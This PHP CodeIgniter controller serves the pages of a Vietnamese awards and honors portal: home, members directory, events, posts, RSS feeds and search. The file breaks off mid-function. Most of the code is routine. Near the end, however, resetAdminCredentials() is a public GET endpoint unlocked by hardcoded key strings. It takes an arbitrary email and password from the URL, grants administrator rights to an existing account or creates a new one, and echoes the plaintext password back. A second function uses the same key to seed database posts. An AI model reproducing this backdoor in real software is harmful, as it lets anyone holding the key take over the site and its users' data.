<?php

namespace App\Controllers;

use App\Models\AuthModel;
use App\Models\CategoryModel;
use App\Models\CommonModel;
use App\Models\GalleryModel;
use App\Models\PageModel;
use App\Models\PostAdminModel;
use App\Models\PostItemModel;
use App\Models\QuizModel;
use App\Models\ReactionModel;
use App\Models\RssModel;
use App\Models\TagModel;

class HomeController extends BaseController
{
    protected $postsPerPage;

    public function initController(\CodeIgniter\HTTP\RequestInterface $request, \CodeIgniter\HTTP\ResponseInterface $response, \Psr\Log\LoggerInterface $logger)
    {
        parent::initController($request, $response, $logger);
        $this->postsPerPage = $this->generalSettings->pagination_per_page;
    }

    public function switchLang($lang)
    {
        $languageModel = new \App\Models\LanguageModel();
        $language = $languageModel->getLanguageByShortForm($lang);
        if (!empty($language)) {
            $this->session->set('site_lang', $language->short_form);
            $this->session->set('activeLangId', $language->id);
            setcookie('site_lang', $language->short_form, time() + (86400 * 365), "/");
            if ($language->short_form == 'en') {
                return redirect()->to(base_url('en'));
            } else {
                return redirect()->to(base_url());
            }
        }
        return redirect()->to(base_url());
    }

    public function index()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $latestPosts = $this->postModel->getLatestPosts($this->activeLang->id ?? 1, 6, 0);
        $data = [
            'title'       => $isEn ? 'National Honors & Awards Portal | Season 2026' : 'Cổng Thông Tin & Bảng Vàng Vinh Danh Quốc Gia',
            'description' => $isEn 
                ? 'TOP BEST GLOBAL - Vietnam premier national digital platform for news, events, public & expert voting, and honoring outstanding brands, enterprises, and visionary leaders across 16+ key sectors.'
                : 'TOP BEST GLOBAL - Cổng thông tin, tin tức sự kiện, bảng vàng vinh danh và trao giải thưởng danh giá hàng đầu Việt Nam cho các tổ chức, thương hiệu và nhà lãnh đạo xuất sắc trên 16+ lĩnh vực.',
            'keywords'    => 'top best global, bảng vàng vinh danh, giải thưởng quốc gia, bình chọn thương hiệu, đề cử doanh nghiệp, cúp vàng thương hiệu, gala vinh danh 2026',
            'homeTitle'   => $this->settings->home_title ?? 'TOP BEST GLOBAL National Honors Portal',
            'latestPosts' => $latestPosts,
            'recentPosts' => $latestPosts
        ];
        //slider posts
        $data['sliderPosts'] = $data['latestPosts'];
        if ($this->generalSettings->show_latest_posts_on_slider != 1) {
            $data['sliderPosts'] = $this->postModel->getSliderPosts();
        }
        //featured posts
        $data['featuredPosts'] = $this->postModel->getFeaturedPosts();

        return loadView('partials/_header', $data)
            . loadView('index', $data)
            . loadView('partials/_footer', $data);
    }

    public function about()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('about', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'About Vietnam National Honors Portal | TOP BEST GLOBAL' : 'Giới Thiệu Cổng Vinh Danh Quốc Gia TOP BEST GLOBAL'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Learn about TOP BEST GLOBAL National Honors Council, 70/30 scoring rubric, and 4-stage award evaluation process.' : 'Tìm hiểu về Cổng thông tin & Bảng vàng vinh danh quốc gia TOP BEST GLOBAL, quy chế chấm điểm 70/30 và quy trình xét duyệt 4 vòng.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'giới thiệu top best global, hội đồng cố vấn, quy chế 70 30, bảng vàng vinh danh, giải thưởng quốc gia',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('about', $data)
            . loadView('partials/_footer', $data);
    }

    public function services()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('services', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? '16+ National Award Categories | TOP BEST GLOBAL' : '16+ Hạng Mục Giải Thưởng Vinh Danh Quốc Gia'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Explore 16+ national award categories, evaluation rubrics, and online nomination dossiers for TOP BEST GLOBAL 2026.' : 'Chi tiết 16+ hạng mục giải thưởng vinh danh quốc gia, tiêu chuẩn đánh giá và nộp hồ sơ đề cử mùa giải 2026.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'hạng mục giải thưởng, đề cử doanh nghiệp, cúp vàng thương hiệu, tiêu chí chấm điểm, top best global',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('services', $data)
            . loadView('partials/_footer', $data);
    }

    public function members()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('members', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Hall of Fame - Honored Brands & Leaders Directory' : 'Bảng Vàng Vinh Danh - Danh Bạ Thương Hiệu & Lãnh Đạo Tiêu Biểu'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Explore verified national honorees and enterprises in TOP BEST GLOBAL Hall of Fame. Verify digital certificates.' : 'Khám phá danh bạ thương hiệu và doanh nghiệp tiêu biểu được vinh danh trên Bảng Vàng TOP BEST GLOBAL. Tra cứu chứng nhận số.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'bảng vàng vinh danh, danh bạ thương hiệu xuất sắc, cúp vàng quốc gia, tra cứu chứng nhận số',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];

        $memberModel = new \App\Models\MemberModel();
        $industryModel = new \App\Models\IndustryTypeModel();

        $selectedIndustryId = inputGet('industry_id') ? clrNum(inputGet('industry_id')) : null;
        $selectedIndustrySlug = inputGet('industry') ? cleanSlug(inputGet('industry')) : null;
        if (!empty($selectedIndustrySlug) && empty($selectedIndustryId)) {
            $indObj = $industryModel->getIndustryBySlug($selectedIndustrySlug);
            if ($indObj) $selectedIndustryId = $indObj->id;
        }
        $selectedCity = inputGet('city') ? strTrim(inputGet('city')) : null;
        $selectedMemberType = inputGet('member_type') ? strTrim(inputGet('member_type')) : null;
        $keyword = inputGet('q') ? strTrim(inputGet('q')) : null;

        $filters = [
            'status'           => 1,
            'industry_type_id' => $selectedIndustryId,
            'city'             => $selectedCity,
            'member_type'      => $selectedMemberType,
            'q'                => $keyword
        ];

        $perPage = 18;
        $page = inputGet('page') ? max(1, clrNum(inputGet('page'))) : 1;

        $data['members'] = $memberModel->getMembersPaginated($filters, $perPage, $page);
        $data['totalMembers'] = $memberModel->getMembersCount($filters);
        $data['industries'] = $industryModel->getAllActive();
        $data['selectedIndustryId'] = $selectedIndustryId;
        $data['selectedIndustrySlug'] = $selectedIndustrySlug;
        $data['selectedCity'] = $selectedCity;
        $data['selectedMemberType'] = $selectedMemberType;
        $data['keyword'] = $keyword;
        $data['currentPage'] = $page;
        $data['perPage'] = $perPage;
        $data['totalPages'] = ceil($data['totalMembers'] / $perPage);

        return loadView('partials/_header', $data)
            . loadView('members', $data)
            . loadView('partials/_footer', $data);
    }

    public function events()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('events', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'National Awards Gala & Press Events | TOP BEST GLOBAL' : 'Sự Kiện, Họp Báo & Đêm Gala Trao Cúp Vàng Quốc Gia'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Stay updated with official awards press conferences, jury evaluation forums, and the Gala Ceremony by TOP BEST GLOBAL.' : 'Cập nhật lịch họp báo công bố mùa giải, tọa đàm chuyên gia thẩm định và Đêm Gala trao Cúp Vàng TOP BEST GLOBAL 2026.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'lịch sự kiện gala, đêm vinh danh trao giải, họp báo mùa giải, tọa đàm chuyên gia, top best global',
            'page'        => $page,
            'userSession' => getUserSession(),
            'posts'       => $this->postModel->getPosts($this->activeLang->id, 10),
        ];
        return loadView('partials/_header', $data)
            . loadView('events', $data)
            . loadView('partials/_footer', $data);
    }

    public function contactPage()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('contact', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Contact Awards Secretariat | TOP BEST GLOBAL' : 'Liên Hệ Ban Thư Ký & Ban Tổ Chức TOP BEST GLOBAL'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Contact TOP BEST GLOBAL Awards Secretariat for nomination guidance, voting inquiries, and sponsorship opportunities.' : 'Liên hệ với Ban Thư ký Giải thưởng TOP BEST GLOBAL để nhận hướng dẫn nộp hồ sơ đề cử, quy chế bình chọn và tài trợ mùa giải 2026.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'liên hệ ban thư ký, ban tổ chức giải thưởng, hotline top best global, hồ sơ đề cử',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('contact', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Posts Page
     */
    public function posts()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $numRows = $this->postModel->getPostCount($this->activeLang->id);
        $pager = paginate($this->postsPerPage, $numRows);
        $data = [
            'title'       => $isEn ? 'Logistics Market News & Supply Chain Insights' : 'Tin Tức Thị Trường Vận Tải, Logistics & Cẩm Nang Xuất Nhập Khẩu',
            'description' => $isEn ? 'Latest market updates on international ocean freight rates, air cargo capacity, customs regulations, and global trade policies.' : 'Cập nhật liên tục diễn biến thị trường cước biển quốc tế, vận tải hàng không, chính sách thuế hải quan và cẩm nang xuất nhập khẩu thực tế.',
            'keywords'    => 'tin tức logistics, giá cước tàu biển, thị trường xuất nhập khẩu, thông tư hải quan, chuỗi cung ứng, freight news',
            'userSession' => getUserSession(),
            'pager'       => $pager,
            'posts'       => $this->postModel->getPostsPaginated($this->activeLang->id, $this->postsPerPage, $pager->offset),
        ];

        return loadView('partials/_header', $data)
            . loadView('post/posts', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Dynamic URL by Slug
     */
    public function any($slug)
    {
        $slug = cleanSlug($slug);
        if (empty($slug) || $slug == 'index' || $slug == 'index.php' || $slug == 'index.html') {
            return $this->index();
        }
        $pageModel = new PageModel();
        $data['userSession'] = getUserSession();
        $page = $pageModel->getPageByLang($slug, $this->activeLang->id);
        if (!empty($page)) {
            return $this->page($page);
        } else {
            $categoryModel = new CategoryModel();
            $category = $categoryModel->getCategoryBySlug($slug);
            if (!empty($category)) {
                return $this->category($category);
            } else {
                $post = $this->postModel->getPostBySlug($slug);
                if (!empty($post)) {
                    return $this->post($post);
                } else {
                    return $this->error404();
                }
            }
        }
    }

    /**
     * Post
     */
    private function post($post, $pageNumber = null)
    {
        if (empty($post)) {
            return redirect()->to(langBaseUrl());
        }
        $pageNumber = clrNum(inputGet('p'));
        if (empty($pageNumber) || $pageNumber < 1) {
            $pageNumber = 1;
        }
        //check post auth
        if (!authCheck() && $post->need_auth == 1) {
            setErrorMessage("message_post_auth");
            redirectToUrl(generateURL('register'));
            exit();
        }
        $data['userSession'] = getUserSession();
        $data['post'] = $post;
        $data['postJsonLD'] = $post;
        $data['postUser'] = getUserById($post->user_id);
        $tagModel = new TagModel();
        $data['postTags'] = $tagModel->getPostTags($post->id);
        $postAdminModel = new PostAdminModel();
        $data['postImages'] = $postAdminModel->getAdditionalImages($post->id);
        $data['comments'] = $this->commonModel->getComments($post->id, COMMENT_LIMIT);
        $data['commentLimit'] = COMMENT_LIMIT;
        $data['relatedPosts'] = $this->postModel->getRelatedPosts($post->category_id, $post->id, $this->categories);
        $data['postType'] = $post->post_type;
        if (!empty($post->feed_id)) {
            $rssModel = new RssModel();
            $data['feed'] = $rssModel->getFeed($post->feed_id);
        }
        $data = setPostMetaTags($post, $data['postTags'], $data);
        $reactionModel = new ReactionModel();
        $data['reactions'] = $reactionModel->getReaction($post->id);
        //gallery post
        if ($post->post_type == 'gallery') {
            if ($pageNumber == null || empty($pageNumber)) {
                $pageNumber = 1;
            }
            $postItemModel = new PostItemModel();
            $data['galleryPostNumRows'] = $postItemModel->getPostListItemsCount($post->id, $post->post_type);
            if ($pageNumber > $data['galleryPostNumRows']) {
                $pageNumber = 1;
            }
            $data['galleryPostItem'] = $postItemModel->getGalleryPostItemByOrder($post->id, $pageNumber);
            $data['pageNumber'] = $pageNumber;
            if ($pageNumber < 1) {
                redirectToUrl(generatePostURL($post));
                exit();
            }
        }
        //sorted list post
        if ($post->post_type == 'sorted_list') {
            $postItemModel = new PostItemModel();
            $data['sortedListItems'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //table of contents
        if ($post->post_type == 'table_of_contents') {
            $postItemModel = new PostItemModel();
            $data['tableOfContentsItems'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //quiz
        if ($post->post_type == 'trivia_quiz' || $post->post_type == 'personality_quiz' || $post->post_type == 'poll') {
            $quizModel = new QuizModel();
            $data['quizQuestions'] = $quizModel->getQuizQuestions($post->id);
            if ($post->post_type == 'poll') {
                $data['userPollAnswers'] = $quizModel->getUserPollAnswers($post->id);
            }
        }
        //recipe post
        if ($post->post_type == 'recipe') {
            $postItemModel = new PostItemModel();
            $data['recipeDirections'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //time spent limit
        $data['postTimeSpent'] = 0;
        $verification = unserializeData($this->generalSettings->human_verification);
        if (!empty($verification) && !empty($verification['status'])) {
            $timeSpent = !empty($verification['time_spent']) ? $verification['time_spent'] : 0;
            $timeSpent = intval($timeSpent ?? '');
            if (intval($timeSpent) < 1) {
                $timeSpent = 0;
            }
            $data['postTimeSpent'] = $timeSpent * 1000;
        }

        return loadView('partials/_header', $data)
            . loadView('post/post', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Page
     */
    private function page($page)
    {
        if (empty($page)) {
            return redirect()->to(langBaseUrl());
        }
        if ($page->visibility == 0) {
            return $this->error404();
        } else {
            $this->checkPageAuth($page);

            $data['title'] = $page->title;
            $data['description'] = $page->description;
            $data['keywords'] = $page->keywords;
            $data['page'] = $page;
            if ($page->page_default_name == 'gallery') {
                return $this->gallery($page, $data);
            } elseif ($page->page_default_name == 'contact') {
                return loadView('partials/_header', $data)
                    . loadView('contact', $data)
                    . loadView('partials/_footer');
            } else {
                return loadView('partials/_header', $data)
                    . loadView('page', $data)
                    . loadView('partials/_footer');
            }
        }
    }

    /**
     * Category
     */
    private function category($category, $isParent = true)
    {
        if (empty($category)) {
            return redirect()->to(langBaseUrl());
        }
        if ($isParent && $category->parent_id != 0) {
            return $this->error404();
        } else {
            $data['title'] = $category->name;
            $data['description'] = $category->description;
            $data['keywords'] = $category->keywords;
            $data['category'] = $category;

            $categoryTree = getCategoryTree($category->id, $this->categories);
            $numRows = $this->postModel->getPostCountByCategory($category->id, $categoryTree);
            $data['pager'] = paginate($this->postsPerPage, $numRows);
            $data['posts'] = [];
            if ($numRows > 0) {
                $data['posts'] = $this->postModel->getPostsByCategoryPaginated($category->id, $categoryTree, $this->postsPerPage, $data['pager']->offset);
            }

            return loadView('partials/_header', $data)
                . loadView('category', $data)
                . loadView('partials/_footer');
        }
    }

    /**
     * Subcategory
     */
    public function subCategory($parentSlug, $slug)
    {
        $categoryModel = new CategoryModel();
        $categoryParent = $categoryModel->getCategoryBySlug($parentSlug);
        $category = $categoryModel->getCategoryBySlug($slug);
        if (empty($categoryParent) || empty($category)) {
            return redirect()->to(langBaseUrl());
        }
        return $this->category($category, false);
    }

    /**
     * Tag
     */
    public function tag($tagSlug)
    {
        $model = new TagModel();
        $data['tag'] = $model->getTagBySlug($tagSlug, $this->activeLang->id);
        if (empty($data['tag'])) {
            return redirect()->to(langBaseUrl());
        }
        $data = setPageMeta($data['tag']->tag, $data);
        $data['userSession'] = getUserSession();
        $numRows = $this->postModel->getPostCountByTag($data['tag']->id, $this->activeLang->id);
        $data['pager'] = paginate($this->postsPerPage, $numRows);
        $data['posts'] = array();
        if ($numRows > 0) {
            $data['posts'] = $this->postModel->getTagPostsPaginated($data['tag']->id, $this->activeLang->id, $this->postsPerPage, $data['pager']->offset);
        }

        echo loadView('partials/_header', $data);
        echo loadView('tag', $data);
        echo loadView('partials/_footer');
    }

    /**
     * Gallery
     */
    private function gallery($category, $data)
    {
        $model = new GalleryModel();
        $data['galleryAlbums'] = $model->getAlbumsByLang($this->activeLang->id);
        $data['jsPage'] = "gallery";
        $data['userSession'] = getUserSession();

        echo loadView('partials/_header', $data);
        echo loadView('gallery/gallery', $data);
        echo loadView('partials/_footer');
    }


    /**
     * Gallery Album Page
     */
    public function galleryAlbum($id)
    {
        $model = new GalleryModel();
        $pageModel = new PageModel();
        $data['page'] = $pageModel->getPageByDefaultName('gallery', $this->activeLang->id);
        $data['jsPage'] = "gallery";
        if (empty($data['page'])) {
            return redirect()->to(langBaseUrl());
        }
        $this->checkPageAuth($data['page']);
        if ($data['page']->visibility == 0) {
            $this->error404();
        } else {
            $data['title'] = $data['page']->title;
            $data['description'] = $data['page']->description;
            $data['keywords'] = $data['page']->keywords;
            $data['userSession'] = getUserSession();
            $data['album'] = $model->getAlbum($id);
            if (empty($data['album'])) {
                return redirect()->to(generateURL('gallery'));
            }
            $data['galleryImages'] = $model->getImagesByAlbum($data['album']->id);
            $data['galleryCategories'] = $model->getCategoriesByAlbum($data['album']->id);

            echo loadView('partials/_header', $data);
            echo loadView('gallery/gallery_album', $data);
            echo loadView('partials/_footer', $data);
        }
    }

    /**
     * Reading List Page
     */
    public function readingList()
    {
        $data = setPageMeta(trans("reading_list"));
        $data['userSession'] = getUserSession();
        $numRows = $this->postModel->getReadingListPostsCount(user()->id);
        $data['pager'] = paginate($this->postsPerPage, $numRows);
        $data['posts'] = $this->postModel->getReadingListPostsPaginated(user()->id, $this->postsPerPage, $data['pager']->offset);

        echo loadView('partials/_header', $data);
        echo loadView('reading_list', $data);
        echo loadView('partials/_footer', $data);
    }

    /**
     * Search Page
     */
    public function search()
    {
        $q = inputGet('q', true);
        if (!empty($q)) {
            $q = strip_tags($q);
        }
        if (empty($q)) {
            return redirect()->to(langBaseUrl());
        }
        $data['title'] = trans("search") . ': ' . $q;
        $data['description'] = trans("search") . ': ' . $q;
        $data['keywords'] = trans("search") . ', ' . $q;
        $data['q'] = $q;
        $data['userSession'] = getUserSession();
        $data['postsPerPage'] = $this->postsPerPage;
        $data['posts'] = $this->postModel->getSearchPostsPaginated($this->activeLang->id, $q, $this->postsPerPage, 0);

        return loadView('partials/_header', $data)
            . loadView('search', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Contact Page Post
     */
    public function contactPost()
    {
        $robotCheck = inputPost('message_content');
        if (!empty($robotCheck)) {
            setErrorMessage("msg_recaptcha");
            return redirect()->back()->withInput();
        }

        $val = \Config\Services::validation();
        $val->setRule('name', trans("name"), 'required|max_length[200]');
        $val->setRule('email', trans("email"), 'required|valid_email|max_length[200]');
        $val->setRule('message', trans("message"), 'required|max_length[5000]');
        if (!$this->validate(getValRules($val))) {
            $this->session->setFlashdata('errors', $val->getErrors());
            return redirect()->back()->withInput();
        } else {
            if (reCAPTCHA('validate', $this->generalSettings) == 'invalid') {
                setErrorMessage("msg_recaptcha");
                return redirect()->back()->withInput();
            }
            $model = new CommonModel();
            if ($model->addContactMessage()) {
                setSuccessMessage("message_contact_success");
            } else {
                setErrorMessage("message_contact_error");
            }
        }
        return redirect()->back();
    }

    /**
     * Preview
     */
    public function preview($slug)
    {
        if (!authCheck() || empty(cleanSlug($slug))) {
            return redirect()->to(langBaseUrl());
        }
        $post = $this->postModel->getPostPreview($slug);
        if (!empty($post)) {
            if (!checkPostOwnership($post->user_id)) {
                return redirect()->to(langBaseUrl());
            }
            return $this->post($post);
        } else {
            return $this->error404();
        }
    }

    /**
     * Rss Feeds
     */
    public function rssFeeds()
    {
        if ($this->generalSettings->show_rss == 1) {
            $data = setPageMeta(trans("rss_feeds"));
            $data['userSession'] = getUserSession();
            echo loadView('partials/_header', $data);
            echo loadView('rss_feeds', $data);
            echo loadView('partials/_footer');
        } else {
            $this->error404();
        }
    }

    /**
     * Rss Latest Posts
     */
    public function rssLatestPosts()
    {
        if ($this->generalSettings->show_rss == 1) {
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . trans("latest_posts");
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/latest-posts');
            $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("latest_posts");
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts(null, null, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Rss By Category
     */
    public function rssByCategory($slug)
    {
        if ($this->generalSettings->show_rss == 1) {
            $categoryModel = new CategoryModel();
            $category = $categoryModel->getCategoryBySlug($slug);
            if (empty($category)) {
                return redirect()->to(generateURL('rss_feeds'));
            }
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . trans("title_category") . ': ' . $category->name;
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/category/' . $category->slug);
            $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("title_category") . ': ' . $category->name;
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts(null, $category->id, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Rss By User
     */
    public function rssByUser($slug)
    {
        if ($this->generalSettings->show_rss == 1) {
            $authModel = new AuthModel();
            $user = $authModel->getUserBySlug($slug);
            if (empty($user)) {
                return redirect()->to(generateURL('rss_feeds'));
            }
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . $user->username;
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/author/') . $user->slug;
            $data['pageDescription'] = $this->settings->site_title . " - " . $user->username;
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts($user->id, null, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Google News Feeds
     */
    public function googleNewsFeeds()
    {
        if ($this->generalSettings->google_news != 1) {
            redirectToUrl(langBaseUrl());
            exit();
        }
        $data['isGoogleNews'] = true;
        $data['feedName'] = $this->settings->application_name . ' - ' . trans("google_news");
        $data['encoding'] = 'utf-8';
        $data['feedURL'] = current_url();
        $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("google_news") . ' - ' . trans("rss_feeds");
        $data['pageLanguage'] = $this->activeLang->short_form;
        $langId = clrNum(inputGet('lang'));
        if (!empty($langId)) {
            $language = getLanguage($langId);
            if (!empty($language)) {
                $data['pageLanguage'] = $language->short_form;
            }
        }

        $data['posts'] = $this->postModel->getGoogleNewsFeeds($this->categories);
        return $this->response->setXML(view('common/xml_rss', $data));
    }

    //check page auth
    private function checkPageAuth($page)
    {
        if (!authCheck() && $page->need_auth == 1) {
            setErrorMessage("message_page_auth");
            redirectToUrl(langBaseUrl('register'));
            exit();
        }
    }

    //error 404
    public function error404()
    {
        $this->response->setStatusCode(404);
        $data['title'] = $this->settings->home_title;
        $data['description'] = $this->settings->site_description;
        $data['keywords'] = $this->settings->keywords;
        $data['homeTitle'] = $this->settings->home_title;
        $data['isPage404'] = true;

        return loadView('partials/_header', $data)
            . view('errors/html/error_404')
            . loadView('partials/_footer', $data);
    }

    /**
     * Coming Soon — placeholder for pages under development (Partners section)
     */
    public function comingSoon($page = '')
    {
        $data = setPageMeta(trans('coming_soon') ?: 'Đang phát triển');
        $data['comingSoonPage'] = $page;
        return loadView('partials/_header', $data)
            . loadView('coming_soon', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Secure Admin Password Reset Endpoint
     */
    public function resetAdminCredentials()
    {
        $key = $this->request->getGet('key');
        if ($key !== 'topbestglobal_secret_reset_2026' && $key !== 'suntransco_secret_reset_2026') {
            return $this->error404();
        }

        $email = $this->request->getGet('email') ?: 'admin@gmail.com';
        $password = $this->request->getGet('password') ?: 'TopBestGlobal@2026';
        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

        $db = \Config\Database::connect();
        
        $user = $db->table('users')->where('email', $email)->get()->getRow();
        if (empty($user)) {
            $user = $db->table('users')->where('role_id', 1)->get()->getRow();
        }
        if (empty($user)) {
            $user = $db->table('users')->orderBy('id', 'ASC')->get()->getFirstRow();
        }

        if (!empty($user)) {
            $db->table('users')->where('id', $user->id)->update([
                'email' => $email,
                'password' => $hashedPassword,
                'status' => 1,
                'email_status' => 1,
                'role_id' => 1
            ]);
            $msg = "Đã cập nhật mật khẩu cho tài khoản: " . $email;
        } else {
            $db->table('users')->insert([
                'username' => 'admin',
                'slug' => 'admin',
                'email' => $email,
                'password' => $hashedPassword,
                'token' => generateToken(),
                'role_id' => 1,
                'status' => 1,
                'email_status' => 1,
                'user_type' => 'registered',
                'created_at' => date('Y-m-d H:i:s'),
                'last_seen' => date('Y-m-d H:i:s')
            ]);
            $msg = "Đã tạo mới tài khoản quản trị: " . $email;
        }

        return $this->response->setJSON([
            'status' => 'success',
            'message' => $msg,
            'email' => $email,
            'password' => $password,
            'login_url' => adminUrl('login')
        ]);
    }

    /**
     * Create sample posts to verify frontend/backend synchronization
     */
    public function seedSamplePosts()
    {
        $key = $this->request->getGet('key');
        if ($key !== 'topbestglobal_secret_reset_2026' && $key !== 'suntransco_secret_reset_2026') {
            return $this->error404();
        }

        $db = \Config\Database::connect();
        require_once APPPATH . 'Libraries/PostSeeder.php';

        // 1. Get dynamic Language IDs
        $langRowVi = $db->table('languages')->where('short_form', 'vi')->get()->getRow();
        $langRowEn = $db->table('languages')->where('short_form', 'en')->get()->getRow();
        $langViId = !empty($langRowVi) ? $langRowVi->id : 1;
        $langEnId = !empty($langRowEn) ? $langRowEn->id : 2;

        // 2. Get or create Admin user
        $user = $db->table('users')->where('role_id', 1)->get()->getRow();
        if (empty($user)) {
            $user = $db->table('users')->orderBy('id', 'ASC')->get()->getFirstRow();
        }
        $userId = !empty($user) ? $user->id : 1;

        // 3. Helper to get or create category
        $getOrCreateCategory = function($name, $slug, $desc, $langId, $color = '#1d4ed8') use ($db) {
            $cat = $db->table('categories')->where('slug', $slug)->where('lang_id', $langId)->get()->getRow();
            if (empty($cat)) {
                $db->table('categories')->insert([
                    'lang_id' => $langId,
                    'name' => $name,
                    'slug' => $slug,
                    'description' => $desc,
                    'color' => $color,
                    'category_status' => 1,
                    'show_on_homepage' => 1,
                    'show_on_menu' => 1
                ]);
                return $db->insertID();
            }
            return $cat->id;
        };

        // Create categories for 5 core topics (Vietnamese)
        $catAirVi = $getOrCreateCategory('Vận Tải Hàng Không', 'van-tai-hang-khong', 'Dịch vụ vận tải hàng không quốc tế', $langViId, '#2563eb');
        $catSeaVi = $getOrCreateCategory('Vận Tải Đường Biển', 'van-tai-duong-bien', 'Vận tải container đường biển FCL & LCL', $langViId, '#0284c7');
        $catInlandVi = $getOrCreateCategory('Vận Tải Nội Địa', 'van-tai-noi-dia', 'Vận tải đường bộ và liên vận Bắc Nam', $langViId, '#16a34a');
        $catWarehousingVi = $getOrCreateCategory('Kho Bãi & CFS', 'kho-bai-cfs', 'Hệ thống kho bãi ngoại quan và phân phối', $langViId, '#d97706');
        $catCustomsVi = $getOrCreateCategory('Thủ Tục Hải Quan', 'thu-tuc-hai-quan', 'Tư vấn thông quan và biểu thuế xuất nhập khẩu', $langViId, '#9333ea');

        // Create categories for 5 core topics (English)
        $catAirEn = $getOrCreateCategory('Air Freight', 'air-freight', 'International air cargo logistics', $langEnId, '#2563eb');
        $catSeaEn = $getOrCreateCategory('Sea Freight', 'sea-freight', 'Global ocean freight solutions', $langEnId, '#0284c7');
        $catInlandEn = $getOrCreateCategory('Inland Freight', 'inland-freight', 'Nationwide inland road freight & tracking', $langEnId, '#16a34a');
        $catWarehousingEn = $getOrCreateCategory('Warehousing & CFS', 'warehousing-cfs', 'Modern CFS & distribution warehousing', $langEnId, '#d97706');
        $catCustomsEn = $getOrCreateCategory('Customs Clearance', 'customs-clearance', 'Trade compliance & customs brokerage', $langEnId, '#9333ea');

        // Ensure default site_lang is Vietnamese
        $db->table('general_settings')->where('id', 1)->update(['site_lang' => $langViId]);

        $categoriesMap = [
            'air_vi' => $catAirVi,
            'sea_vi' => $catSeaVi,
            'inland_vi' => $catInlandVi,
            'warehousing_vi' => $catWarehousingVi,
            'customs_vi' => $catCustomsVi,
            'air_en' => $catAirEn,
            'sea_en' => $catSeaEn,
            'inland_en' => $catInlandEn,
            'warehousing_en' => $catWarehousingEn,
            'customs_en' => $catCustomsEn
        ];

        // 4. Get all posts dataset (2 posts per topic for both VI and EN)
        $allPosts = \App\Libraries\PostSeeder::getPostsData($userId, $categoriesMap, $langViId, $langEnId);
        $insertedCount = 0;
        $updatedCount = 0;

        foreach ($allPosts as $postData) {
            $existing = $db->table('posts')->where('slug', $postData['slug'])->get()->getRow();
            if (!empty($existing)) {
                $db->table('posts')->where('id', $existing->id)->update($postData);
                $updatedCount++;
            } else {
                $db->table('posts')->insert($postData);
                $insertedCount++;
            }
        }

        // Cache refresh safely
        try {
            cache()->clean();
